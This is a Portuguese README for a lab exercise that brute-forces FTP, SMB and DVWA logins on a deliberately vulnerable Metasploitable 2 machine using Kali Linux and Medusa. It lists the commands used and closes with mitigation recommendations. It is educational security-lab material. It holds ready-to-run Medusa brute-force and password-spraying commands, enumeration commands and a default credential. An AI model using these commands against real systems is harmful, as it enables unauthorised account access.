# Repositório do Desafio de Projeto - Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
 
## <img src="https://img.icons8.com/?size=100&id=Gm9o7FfdYOhV&format=png&color=000000" width="30"/>  Descrição
Um projeto de testes de força bruta utilizando Kali Linux e Medusa contra Metasploitable 2, simulando ataques em FTP, SMB, DVWA e Password Spraying para identificar vulnerabilidades, documentar e propor medidas de segurança.
<br>

##  <img src="https://img.icons8.com/?size=100&id=92oZwSFODREJ&format=png&color=000000" width="30"/> Ferramentas | Tecnologias
• [VirtualBox](https://www.oracle.com/br/virtualization/virtualbox/) com rede interna (host-only)  
• [Kali Linux](https://www.kali.org)  
• [DVWA](https://www.dvwa.co.uk)  
• [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)  
• [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)  
• [Terminal Linux](https://zsh.sourceforge.io/Guide/zshguide01.html)
<br>

##  <img src="https://img.icons8.com/?size=100&id=yggUP2AbmFLz&format=png&color=000000" width="30"/> Ambiente
• VirtualBox — rede isolada (Host-only)  
• DVWA — aplicação web propositalmente vulnerável  
• Kali Linux em VM — atacante  
• Metasploitable 2 — alvo  
<br>

## <img src="https://img.icons8.com/?size=100&id=deeE9DHeelmc&format=png&color=000000" width="30"/> Arquivos (Wordlists)  
Para realização dos testes de força bruta foram criados dois arquivos simples contendo combinações comuns de usuários e senhas:

• [```users.txt```](src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/users.txt"'>): Este arquivo contém uma lista de usuários (wordlist) personalizados para o ataque nos serviços vulneráveis    
• [```pass.txt```](src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/pass.txt"'>): Este arquivo contém uma lista de senhas  (wordlist) personalizados para o ataque nas tentativas de autenticação

• Criação dos arquivos de usuários e senhas:  

<pre><code>echo -e "user\nmsfadmin\nservice\nadmin\nroot" > users.txt</code></pre>

<pre><code>echo -e "123456\npassword\nqwerty\nWelcome123\nmsfadmin" > pass.txt</code></pre>

## <img src="https://img.icons8.com/?size=100&id=bJclkWKA0ENc&format=png&color=000000" width="30"/> Ataques Realizados | Comandos Utilizados  
<br>

● **FTP** — força bruta  
Objetivo: Testar credenciais  
<pre><code>medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4</code></pre>

▶ Validação (com as credenciais encontradas):  

<pre><code>ftp 192.168.56.101
ou
lftp -u usuario,senha 192.168.56.10</code></pre>
<br>

● **Ataque ao Formulário Web** (DVWA) — brute force no formulário  
Objetivo: Testar credenciais contra o login da DVWA  
<pre><code>medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:/dvwa/login.php \
-m "FORM:username=^USER^&password=^PASS^&Login=Login" \
-m "FAIL:Login failed" -t 6</code></pre>  

▶ Validação: acessar o endereço http://192.168.56.101/dvwa/login.php e testar as credenciais encontradas
<br>

● **Ataque ao Serviço SMB** — password spraying    
Objetivo: Quebrar autenticação SMB no Metasploitable2
<pre><code>medusa -h 192.168.56.101 -U users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50</code></pre>  

▶ Validação:
<pre><code>smbclient -L //192.168.56.101 -U usuario%senha
ou
smbclient //192.168.56.101/share -U usuario%senha</code></pre>
<br>

▶ Enumeração (SMB)
<pre><code>enum4linux -a 192.168.56.101</code></pre>  
<br>

## <img src="https://img.icons8.com/?size=100&id=bL1u3LZyblT2&format=png&color=000000" width="30"/> Resultados:  

● FTP: credencial encontrada (msfadmin:msfadmin); login validado via lftp  
● DVWA: credencial encontrada via Medusa e validada comparando a string de falha; login confirmado no browser  
● SMB: password spraying comprovou senha fraca para usuário enumerado; acesso testado com smbclient  

▶ Log de Enumeração <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/enum4linux_log">
<br>
▶ FORM <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/form.png" width='50%'>
<br>
▶ SMB <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb.png" width='50%'>
<br>
▶ SMB-SUCCESS<img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb-success" width='50%'>
<br>

## <img src="https://img.icons8.com/?size=100&id=6cRQkz9fQQD2&format=png&color=000000" width="30"/> Recomendações de Mitigação  
Tendo como base as vulnerabilidades exploradas, as seguintes contramedidas são essenciais para o fortalecimento da segurança:  

● **Política de Senhas Fortes**: implementar requisitos de complexidade (caracteres especiais, maiúsculas, minúsculas, números) e comprimento mínimo (12+ caracteres) para todas as credenciais  
● **Mecanismo de Bloqueio de Contas** (Account Lockout / Rate Limiting): bloquear contas de usuários automaticamente após um número limitado de tentativas de login falhas  
● **Autenticação Multifator** (MFA): habilitar MFA em todos os serviços críticos  
● **Substituição de Serviços Inseguros**: utilizar serviços com maior grau de segurança, como SFTP/FTPS no lugar de FTP  
● **SMB**: desabilitar NTLMv1, aplicar atualizações e restrições de acesso  
● **Monitoramento e Alertas**: utilizar sistemas de detecção de intrusão (IDS) e SIEM para monitorar logs de autenticação e gerar alertas para atividades suspeitas, usar fail2ban para bloqueios automáticos de diversas tentaivas de validação por um único IP  
● **CAPTCHA para Aplicações Web**: implementar CAPTCHA ou reCAPTCHA em formulários de login para diferenciar usuários humanos de bots automatizados, para mitigar ataques de força bruta em escala  
● **Desabilitar Contas Padrão**: nunca utilizar credenciais padrão em produção; alterar todas as senhas de contas de serviço e de administrador durante as configurações iniciais  
● **Segmentação de Rede**: implementar sub-redes para limitar exposição de serviços críticos e aplicar VLANs/firewalls internos  
<br>

## <img src="https://img.icons8.com/?size=100&id=MexKOWjN2DR1&format=png&color=000000" width="30"/> Nota de Atenção
▸ Todos os procedimentos foram realizados em ambiente controlado para testes éticos de segurança e fins educativos, atentando para:  
* <b>Uso Responsável</b>
* <b>Legislação Vigente</b>
* <b>Propósito Educacional</b>
